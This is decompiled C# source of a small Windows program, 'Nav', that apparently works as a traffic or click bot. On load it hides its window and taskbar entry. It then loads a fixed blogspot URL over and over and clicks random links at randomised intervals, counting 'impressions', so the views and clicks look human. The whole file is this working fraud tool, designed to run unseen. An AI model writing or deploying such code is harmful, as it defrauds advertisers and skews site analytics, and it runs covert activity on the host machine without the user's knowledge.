using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Nav;

[DesignerGenerated]
public class Nav : Form
{
	private IContainer components;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("TimerTimeOut")]
	private Timer _TimerTimeOut;

	[AccessedThroughProperty("TimerClick")]
	private Timer _TimerClick;

	public string URL;

	public string RandUserAgent;

	public string Impressions;

	public bool Clicked;

	public bool Flag;

	internal virtual WebBrowser WebBrowser1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			WebBrowserDocumentCompletedEventHandler val = new WebBrowserDocumentCompletedEventHandler(WebBrowser1_DocumentCompleted);
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.remove_DocumentCompleted(val);
			}
			_WebBrowser1 = value;
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.add_DocumentCompleted(val);
			}
		}
	}

	internal virtual Timer TimerTimeOut
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerTimeOut;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TimerTimeOut_Tick;
			if (_TimerTimeOut != null)
			{
				_TimerTimeOut.remove_Tick(eventHandler);
			}
			_TimerTimeOut = value;
			if (_TimerTimeOut != null)
			{
				_TimerTimeOut.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer TimerClick
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerClick;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TimerClick_Tick;
			if (_TimerClick != null)
			{
				_TimerClick.remove_Tick(eventHandler);
			}
			_TimerClick = value;
			if (_TimerClick != null)
			{
				_TimerClick.add_Tick(eventHandler);
			}
		}
	}

	public Nav()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		URL = "http://thetechboxx.blogspot.com";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		components = new Container();
		WebBrowser1 = new WebBrowser();
		TimerTimeOut = new Timer(components);
		TimerClick = new Timer(components);
		((Control)this).SuspendLayout();
		WebBrowser1.set_AllowWebBrowserDrop(false);
		((Control)WebBrowser1).set_Dock((DockStyle)5);
		WebBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		WebBrowser webBrowser = WebBrowser1;
		Point location = new Point(0, 0);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		Size minimumSize = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(minimumSize);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser1.set_ScriptErrorsSuppressed(true);
		WebBrowser1.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser3 = WebBrowser1;
		minimumSize = new Size(275, 224);
		((Control)webBrowser3).set_Size(minimumSize);
		((Control)WebBrowser1).set_TabIndex(0);
		WebBrowser1.set_WebBrowserShortcutsEnabled(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		minimumSize = new Size(275, 224);
		((Form)this).set_ClientSize(minimumSize);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).set_Name("Nav");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Nav");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	public long Rand(long Low, long High)
	{
		return checked((int)Math.Round((float)(High - Low + 1L) * VBMath.Rnd()) + Low);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		Process[] processesByName = Process.GetProcessesByName("nav");
		if (processesByName.Length > 1)
		{
			((Form)this).Close();
		}
		VBMath.Randomize();
		Impressions = Conversions.ToString(Rand(1L, 20L));
		WebBrowser1.Navigate(URL);
	}

	private void WebBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		checked
		{
			if (Clicked)
			{
				VBMath.Randomize();
				TimerTimeOut.set_Interval((int)Rand(5000L, 12000L));
				TimerTimeOut.set_Enabled(true);
			}
			else if (Conversions.ToDouble(Impressions) < 25.0)
			{
				Impressions = Conversions.ToString(Conversions.ToDouble(Impressions) + 1.0);
				VBMath.Randomize();
				TimerClick.set_Interval((int)Rand(5000L, 22000L));
				TimerClick.set_Enabled(true);
			}
			else
			{
				((Form)this).Close();
			}
		}
	}

	private void TimerClick_Tick(object sender, EventArgs e)
	{
		TimerClick.set_Enabled(false);
		VBMath.Randomize();
		int count = WebBrowser1.get_Document().get_Links().get_Count();
		checked
		{
			count--;
			int num = (int)Rand(1L, count);
			Clicked = true;
			WebBrowser1.get_Document().get_Links().get_Item(num)
				.InvokeMember("Click");
			TimerTimeOut.set_Interval((int)Rand(15000L, 25000L));
			TimerTimeOut.set_Enabled(true);
		}
	}

	private void TimerTimeOut_Tick(object sender, EventArgs e)
	{
		TimerTimeOut.set_Enabled(false);
		Clicked = false;
		WebBrowser1.Navigate(URL);
	}
}
